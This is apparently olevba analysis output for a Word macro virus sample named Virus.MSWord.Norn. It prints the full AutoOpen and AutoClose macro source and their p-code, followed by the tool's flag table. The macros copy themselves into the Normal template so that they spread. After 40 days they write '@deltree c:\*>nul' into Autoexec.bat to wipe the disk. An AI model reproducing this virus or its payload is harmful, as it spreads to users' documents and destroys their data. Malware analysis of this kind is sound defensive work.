olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Norn
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Norn - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Norn - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "F%"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoClose.MAIN"
Dim n$
Dim m$
Dim a$
Dim t$
Dim o$
Dim c$
'ver. 6.0520.24
WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error GoTo -1: On Error GoTo quit
WordBasic.CurValues.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
n$ = WordBasic.[FileName$]()
m$ = WordBasic.[DefaultDir$](2) + "\norm"
a$ = ":Auto"
t$ = m$ + "al"
o$ = a$ + "Open"
c$ = a$ + "Close"
WordBasic.MacroCopy t$ + o$, (n$ + o$), 1
WordBasic.MacroCopy t$ + c$, (n$ + c$), 1
WordBasic.FileSaveAs dlg
GoTo done
quit:
If Err.Number <> 102 Then WordBasic.FileSaveAs dlg
WordBasic.MsgBox Str(Err.Number), -2
done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Norn - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "F%"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim name_$
Dim ver
Dim n$
Dim m$
Dim a$
Dim t$
Dim o$
Dim c$
Dim w$
Dim m_
Dim c_
Dim o_
Dim t2$
'ver. 6.059.27
name_$ = "Gest"
ver = 2
n$ = WordBasic.[FileName$]()
m$ = WordBasic.[DefaultDir$](2) + "\norm"
a$ = "Auto"
t$ = m$ + "al"
o$ = ":" + a$ + "Open"
c$ = ":" + a$ + "Close"
w$ = "win.ini"
On Error GoTo -1: On Error GoTo quit
For m_ = 1 To WordBasic.CountMacros(0, 0)
c_ = -(WordBasic.[MacroName$](m_, 0, 0) = c$)
o_ = -(WordBasic.[MacroName$](m_, 0, 0) = o$)
Next m_
If WordBasic.Val(WordBasic.[GetPrivateProfileString$](name_$, a$, w$)) > ver Then
WordBasic.MacroCopy t$ + o$, (n$ + o$)
WordBasic.MacroCopy t$ + c$, (t2$ + c$)
ElseIf Not c_ And Not o_ Then
WordBasic.MacroCopy n$ + o$, (t$ + o$)
WordBasic.MacroCopy n$ + c$, (t$ + c$)
WordBasic.SetPrivateProfileString name_$, a$, Str(ver), w$
WordBasic.SetPrivateProfileString name_$, "date", Str(WordBasic.Today()), w$
End If
If WordBasic.Val(WordBasic.[GetPrivateProfileString$](name_$, "date", w$)) + 40 < WordBasic.Today() Then
WordBasic.FileOpen Name:="c:\" + a$ + "exec.bat", AddToMru:=0
WordBasic.StartOfDocument
WordBasic.Insert "@deltree c:\*>nul"
WordBasic.InsertPara
WordBasic.DocClose 1
End If
quit:
WordBasic.ToolsOptionsSave GlobalDotPrompt:=1
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Norn
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/AutoClose - 2513 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn n
' Line #3:
' 	Dim 
' 	VarDefn m
' Line #4:
' 	Dim 
' 	VarDefn a
' Line #5:
' 	Dim 
' 	VarDefn t
' Line #6:
' 	Dim 
' 	VarDefn o
' Line #7:
' 	Dim 
' 	VarDefn c
' Line #8:
' 	QuoteRem 0x0000 0x000E "ver. 6.0520.24"
' Line #9:
' 	LitDI2 0x0000 
' 	ParamNamed GlobalDotPrompt 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsOptionsSave 0x0001 
' Line #10:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #11:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError quit 
' Line #12:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #13:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' 	EndIf 
' Line #14:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St n$ 
' Line #15:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x0005 "\norm"
' 	Add 
' 	St m$ 
' Line #16:
' 	LitStr 0x0005 ":Auto"
' 	St a$ 
' Line #17:
' 	Ld m$ 
' 	LitStr 0x0002 "al"
' 	Add 
' 	St t$ 
' Line #18:
' 	Ld a$ 
' 	LitStr 0x0004 "Open"
' 	Add 
' 	St o$ 
' Line #19:
' 	Ld a$ 
' 	LitStr 0x0005 "Close"
' 	Add 
' 	St c$ 
' Line #20:
' 	Ld t$ 
' 	Ld o$ 
' 	Add 
' 	Ld n$ 
' 	Ld o$ 
' 	Add 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #21:
' 	Ld t$ 
' 	Ld c$ 
' 	Add 
' 	Ld n$ 
' 	Ld c$ 
' 	Add 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #22:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #23:
' 	GoTo done 
' Line #24:
' 	Label quit 
' Line #25:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x0066 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' 	EndIf 
' Line #26:
' 	Ld Err 
' 	MemLd Number 
' 	ArgsLd Str 0x0001 
' 	LitDI2 0x0002 
' 	UMi 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0002 
' Line #27:
' 	Label done 
' Line #28:
' 	EndSub 
' Macros/VBA/AutoOpen - 3576 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn name_
' Line #3:
' 	Dim 
' 	VarDefn ver
' Line #4:
' 	Dim 
' 	VarDefn n
' Line #5:
' 	Dim 
' 	VarDefn m
' Line #6:
' 	Dim 
' 	VarDefn a
' Line #7:
' 	Dim 
' 	VarDefn t
' Line #8:
' 	Dim 
' 	VarDefn o
' Line #9:
' 	Dim 
' 	VarDefn c
' Line #10:
' 	Dim 
' 	VarDefn w
' Line #11:
' 	Dim 
' 	VarDefn m_
' Line #12:
' 	Dim 
' 	VarDefn c_
' Line #13:
' 	Dim 
' 	VarDefn o_
' Line #14:
' 	Dim 
' 	VarDefn t2
' Line #15:
' 	QuoteRem 0x0000 0x000D "ver. 6.059.27"
' Line #16:
' 	LitStr 0x0004 "Gest"
' 	St name_$ 
' Line #17:
' 	LitDI2 0x0002 
' 	St ver 
' Line #18:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St n$ 
' Line #19:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x0005 "\norm"
' 	Add 
' 	St m$ 
' Line #20:
' 	LitStr 0x0004 "Auto"
' 	St a$ 
' Line #21:
' 	Ld m$ 
' 	LitStr 0x0002 "al"
' 	Add 
' 	St t$ 
' Line #22:
' 	LitStr 0x0001 ":"
' 	Ld a$ 
' 	Add 
' 	LitStr 0x0004 "Open"
' 	Add 
' 	St o$ 
' Line #23:
' 	LitStr 0x0001 ":"
' 	Ld a$ 
' 	Add 
' 	LitStr 0x0005 "Close"
' 	Add 
' 	St c$ 
' Line #24:
' 	LitStr 0x0007 "win.ini"
' 	St w$ 
' Line #25:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError quit 
' Line #26:
' 	StartForVariable 
' 	Ld m_ 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	For 
' Line #27:
' 	Ld m_ 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	Ld c$ 
' 	Eq 
' 	Paren 
' 	UMi 
' 	St c_ 
' Line #28:
' 	Ld m_ 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	Ld o$ 
' 	Eq 
' 	Paren 
' 	UMi 
' 	St o_ 
' Line #29:
' 	StartForVariable 
' 	Ld m_ 
' 	EndForVariable 
' 	NextVar 
' Line #30:
' 	Ld name_$ 
' 	Ld a$ 
' 	Ld w$ 
' 	Ld WordBasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	Ld WordBasic 
' 	ArgsMemLd Val 0x0001 
' 	Ld ver 
' 	Gt 
' 	IfBlock 
' Line #31:
' 	Ld t$ 
' 	Ld o$ 
' 	Add 
' 	Ld n$ 
' 	Ld o$ 
' 	Add 
' 	Paren 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #32:
' 	Ld t$ 
' 	Ld c$ 
' 	Add 
' 	Ld t2$ 
' 	Ld c$ 
' 	Add 
' 	Paren 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #33:
' 	Ld c_ 
' 	Not 
' 	Ld o_ 
' 	Not 
' 	And 
' 	ElseIfBlock 
' Line #34:
' 	Ld n$ 
' 	Ld o$ 
' 	Add 
' 	Ld t$ 
' 	Ld o$ 
' 	Add 
' 	Paren 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #35:
' 	Ld n$ 
' 	Ld c$ 
' 	Add 
' 	Ld t$ 
' 	Ld c$ 
' 	Add 
' 	Paren 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #36:
' 	Ld name_$ 
' 	Ld a$ 
' 	Ld ver 
' 	ArgsLd Str 0x0001 
' 	Ld w$ 
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #37:
' 	Ld name_$ 
' 	LitStr 0x0004 "date"
' 	Ld WordBasic 
' 	ArgsMemLd Today 0x0000 
' 	ArgsLd Str 0x0001 
' 	Ld w$ 
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	Ld name_$ 
' 	LitStr 0x0004 "date"
' 	Ld w$ 
' 	Ld WordBasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	Ld WordBasic 
' 	ArgsMemLd Val 0x0001 
' 	LitDI2 0x0028 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd Today 0x0000 
' 	Lt 
' 	IfBlock 
' Line #40:
' 	LitStr 0x0003 "c:\"
' 	Ld a$ 
' 	Add 
' 	LitStr 0x0008 "exec.bat"
' 	Add 
' 	ParamNamed New 
' 	LitDI2 0x0000 
' 	ParamNamed AddToMru 
' 	Ld WordBasic 
' 	ArgsMemCall FileOpen 0x0002 
' Line #41:
' 	Ld WordBasic 
' 	ArgsMemCall StartOfDocument 0x0000 
' Line #42:
' 	LitStr 0x0011 "@deltree c:\*>nul"
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #43:
' 	Ld WordBasic 
' 	ArgsMemCall InsertPara 0x0000 
' Line #44:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall DocClose 0x0001 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	Label quit 
' Line #47:
' 	LitDI2 0x0001 
' 	ParamNamed GlobalDotPrompt 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsOptionsSave 0x0001 
' Line #48:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|exec                |May run an executable file or a system       |
|          |                    |command using Excel 4 Macros (XLM/XLF)       |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |exec.bat            |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

